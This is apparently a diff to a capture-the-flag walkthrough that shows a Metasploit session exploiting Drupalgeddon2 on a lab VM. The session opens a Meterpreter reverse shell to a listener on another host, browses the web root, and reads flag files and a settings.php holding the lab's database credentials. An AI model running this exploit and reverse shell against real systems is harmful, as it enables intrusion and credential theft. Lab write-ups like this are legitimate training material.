@@ -368,3 +368,241 @@ Shellcodes: No Results
 
 ```
 
+And here I got the shell of VM : 
+```
+┌──(root㉿kali)-[/home/kali]
+└─# msfconsole
+Metasploit tip: Search can apply complex filters such as search cve:2009 
+type:exploit, see all the filters with help search
+                                                  
+IIIIII    dTb.dTb        _.---._
+  II     4'  v  'B   .'"".'/|\`.""'.
+  II     6.     .P  :  .' / | \ `.  :
+  II     'T;. .;P'  '.'  /  |  \  `.'
+  II      'T; ;P'    `. /   |   \ .'
+IIIIII     'YvP'       `-.__|__.-'
+
+I love shells --egypt
+
+
+       =[ metasploit v6.4.98-dev                                ]
++ -- --=[ 2,571 exploits - 1,316 auxiliary - 1,683 payloads     ]
++ -- --=[ 433 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > search Drupal
+
+Matching Modules
+================
+
+   #   Name                                                              Disclosure Date  Rank       Check  Description
+   -   ----                                                              ---------------  ----       -----  -----------
+   0   exploit/unix/webapp/drupal_coder_exec                             2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
+   1   exploit/unix/webapp/drupal_drupalgeddon2                          2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
+   2     \_ target: Automatic (PHP In-Memory)                            .                .          .      .
+   3     \_ target: Automatic (PHP Dropper)                              .                .          .      .
+   4     \_ target: Automatic (Unix In-Memory)                           .                .          .      .
+   5     \_ target: Automatic (Linux Dropper)                            .                .          .      .
+   6     \_ target: Drupal 7.x (PHP In-Memory)                           .                .          .      .
+   7     \_ target: Drupal 7.x (PHP Dropper)                             .                .          .      .
+   8     \_ target: Drupal 7.x (Unix In-Memory)                          .                .          .      .
+   9     \_ target: Drupal 7.x (Linux Dropper)                           .                .          .      .
+   10    \_ target: Drupal 8.x (PHP In-Memory)                           .                .          .      .
+   11    \_ target: Drupal 8.x (PHP Dropper)                             .                .          .      .
+   12    \_ target: Drupal 8.x (Unix In-Memory)                          .                .          .      .
+   13    \_ target: Drupal 8.x (Linux Dropper)                           .                .          .      .
+   14    \_ AKA: SA-CORE-2018-002                                        .                .          .      .
+   15    \_ AKA: Drupalgeddon 2                                          .                .          .      .
+   16  exploit/multi/http/drupal_drupageddon                             2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
+   17    \_ target: Drupal 7.0 - 7.31 (form-cache PHP injection method)  .                .          .      .
+   18    \_ target: Drupal 7.0 - 7.31 (user-post PHP injection method)   .                .          .      .
+   19  auxiliary/gather/drupal_openid_xxe                                2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
+   20  exploit/unix/webapp/drupal_restws_exec                            2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
+   21  exploit/unix/webapp/drupal_restws_unserialize                     2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
+   22    \_ target: PHP In-Memory                                        .                .          .      .
+   23    \_ target: Unix In-Memory                                       .                .          .      .
+   24  auxiliary/scanner/http/drupal_views_user_enum                     2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
+   25  exploit/unix/webapp/php_xmlrpc_eval                               2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
+
+
+Interact with a module by name or index. For example info 25, use 25 or use exploit/unix/webapp/php_xmlrpc_eval
+
+msf > use 1
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf exploit(unix/webapp/drupal_drupalgeddon2) > options
+
+Module options (exploit/unix/webapp/drupal_drupalgeddon2):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   DUMP_OUTPUT  false            no        Dump payload command output
+   PHP_FUNC     passthru         yes       PHP function to execute
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, socks5h, http, sapni
+   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT        80               yes       The target port (TCP)
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI    /                yes       Path to Drupal install
+   VHOST                         no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.6         yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (PHP In-Memory)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.0.2.10
+RHOSTS => 10.0.2.10
+msf exploit(unix/webapp/drupal_drupalgeddon2) > exploit
+[*] Started reverse TCP handler on 10.0.2.6:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[!] The service is running, but could not be validated.
+[*] Sending stage (41224 bytes) to 10.0.2.10
+[*] Meterpreter session 1 opened (10.0.2.6:4444 -> 10.0.2.10:45730) at 2025-11-24 13:43:20 -0500
+
+meterpreter > 
+meterpreter > ls
+Listing: /var/www
+=================
+
+Mode              Size            Type  Last modified                      Name
+----              ----            ----  -------------                      ----
+100644/rw-r--r--  747324309678    fil   188498731153-02-08 21:33:43 -0500  .gitignore
+100644/rw-r--r--  24769076401799  fil   188498731153-02-08 21:33:43 -0500  .htaccess
+100644/rw-r--r--  6360846566857   fil   188498731153-02-08 21:33:43 -0500  COPYRIGHT.txt
+100644/rw-r--r--  6231997547947   fil   188498731153-02-08 21:33:43 -0500  INSTALL.mysql.txt
+100644/rw-r--r--  8048768714578   fil   188498731153-02-08 21:33:43 -0500  INSTALL.pgsql.txt
+100644/rw-r--r--  5574867551506   fil   188498731153-02-08 21:33:43 -0500  INSTALL.sqlite.txt
+100644/rw-r--r--  76712410891717  fil   188498731153-02-08 21:33:43 -0500  INSTALL.txt
+100755/rwxr-xr-x  77704548337324  fil   188270147139-03-11 10:02:15 -0500  LICENSE.txt
+100644/rw-r--r--  35180077129727  fil   188498731153-02-08 21:33:43 -0500  MAINTAINERS.txt
+100644/rw-r--r--  23089744188672  fil   188498731153-02-08 21:33:43 -0500  README.txt
+100644/rw-r--r--  41412074677674  fil   188498731153-02-08 21:33:43 -0500  UPGRADE.txt
+100644/rw-r--r--  28363964029388  fil   188498731153-02-08 21:33:43 -0500  authorize.php
+100644/rw-r--r--  3092376453840   fil   188498731153-02-08 21:33:43 -0500  cron.php
+100644/rw-r--r--  223338299444    fil   211037522224-07-25 00:21:02 -0400  flag1.txt
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  includes
+100644/rw-r--r--  2272037700113   fil   188498731153-02-08 21:33:43 -0500  index.php
+100644/rw-r--r--  3019362009791   fil   188498731153-02-08 21:33:43 -0500  install.php
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  misc
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  modules
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  profiles
+100644/rw-r--r--  6704443950617   fil   188498731153-02-08 21:33:43 -0500  robots.txt
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  scripts
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  sites
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  themes
+100644/rw-r--r--  85645942869477  fil   188498731153-02-08 21:33:43 -0500  update.php
+100644/rw-r--r--  9354438772866   fil   188498731153-02-08 21:33:43 -0500  web.config
+100644/rw-r--r--  1791001362849   fil   188498731153-02-08 21:33:43 -0500  xmlrpc.php
+
+meterpreter > cat flag1.txt
+Every good CMS needs a config file - and so do you.
+
+meterpreter > cat flag1.txt
+Every good CMS needs a config file - and so do you.
+meterpreter > find ./ -name config
+[-] Unknown command: find. Run the help command for more details.
+meterpreter > pwd
+/var/www
+meterpreter > cd
+Usage: cd directory
+meterpreter > ls
+Listing: /var/www
+=================
+
+Mode              Size            Type  Last modified                      Name
+----              ----            ----  -------------                      ----
+100644/rw-r--r--  747324309678    fil   188498731153-02-08 21:33:43 -0500  .gitignore
+100644/rw-r--r--  24769076401799  fil   188498731153-02-08 21:33:43 -0500  .htaccess
+100644/rw-r--r--  6360846566857   fil   188498731153-02-08 21:33:43 -0500  COPYRIGHT.txt
+100644/rw-r--r--  6231997547947   fil   188498731153-02-08 21:33:43 -0500  INSTALL.mysql.txt
+100644/rw-r--r--  8048768714578   fil   188498731153-02-08 21:33:43 -0500  INSTALL.pgsql.txt
+100644/rw-r--r--  5574867551506   fil   188498731153-02-08 21:33:43 -0500  INSTALL.sqlite.txt
+100644/rw-r--r--  76712410891717  fil   188498731153-02-08 21:33:43 -0500  INSTALL.txt
+100755/rwxr-xr-x  77704548337324  fil   188270147139-03-11 10:02:15 -0500  LICENSE.txt
+100644/rw-r--r--  35180077129727  fil   188498731153-02-08 21:33:43 -0500  MAINTAINERS.txt
+100644/rw-r--r--  23089744188672  fil   188498731153-02-08 21:33:43 -0500  README.txt
+100644/rw-r--r--  41412074677674  fil   188498731153-02-08 21:33:43 -0500  UPGRADE.txt
+100644/rw-r--r--  28363964029388  fil   188498731153-02-08 21:33:43 -0500  authorize.php
+100644/rw-r--r--  3092376453840   fil   188498731153-02-08 21:33:43 -0500  cron.php
+100644/rw-r--r--  223338299444    fil   211037522224-07-25 00:21:02 -0400  flag1.txt
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  includes
+100644/rw-r--r--  2272037700113   fil   188498731153-02-08 21:33:43 -0500  index.php
+100644/rw-r--r--  3019362009791   fil   188498731153-02-08 21:33:43 -0500  install.php
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  misc
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  modules
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  profiles
+100644/rw-r--r--  6704443950617   fil   188498731153-02-08 21:33:43 -0500  robots.txt
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  scripts
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  sites
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  themes
+100644/rw-r--r--  85645942869477  fil   188498731153-02-08 21:33:43 -0500  update.php
+100644/rw-r--r--  9354438772866   fil   188498731153-02-08 21:33:43 -0500  web.config
+100644/rw-r--r--  1791001362849   fil   188498731153-02-08 21:33:43 -0500  xmlrpc.php
+
+meterpreter > cd sites
+meterpreter > ls
+Listing: /var/www/sites
+=======================
+
+Mode              Size            Type  Last modified                      Name
+----              ----            ----  -------------                      ----
+100644/rw-r--r--  3882650436488   fil   188498731153-02-08 21:33:43 -0500  README.txt
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  all
+040555/r-xr-xr-x  17592186048512  dir   211037744751-06-28 21:04:17 -0400  default
+100644/rw-r--r--  10157597657405  fil   188498731153-02-08 21:33:43 -0500  example.sites.php
+
+meterpreter > cd default
+meterpreter > ls
+Listing: /var/www/sites/default
+===============================
+
+Mode              Size            Type  Last modified                      Name
+----              ----            ----  -------------                      ----
+100644/rw-r--r--  99651831224994  fil   188498731153-02-08 21:33:43 -0500  default.settings.php
+040775/rwxrwxr-x  17592186048512  dir   211037438521-10-10 04:26:47 -0400  files
+100444/r--r--r--  68672232111733  fil   211037744751-06-28 21:04:17 -0400  settings.php
+
+meterpreter > cat settings.php
+<?php
+
+/**
+ *
+ * flag2
+ * Brute force and dictionary attacks aren't the
+ * only ways to gain access (and you WILL need access).
+ * What can you do with these credentials?
+ *
+ */
+
+$databases = array (
+  'default' => 
+  array (
+    'default' => 
+    array (
+      'database' => 'drupaldb',
+      'username' => 'dbuser',
+      'password' => 'R0ck3t',
+      'host' => 'localhost',
+      'port' => '',
+      'driver' => 'mysql',
+      'prefix' => '',
+    ),
+  ),
+);
+
+```
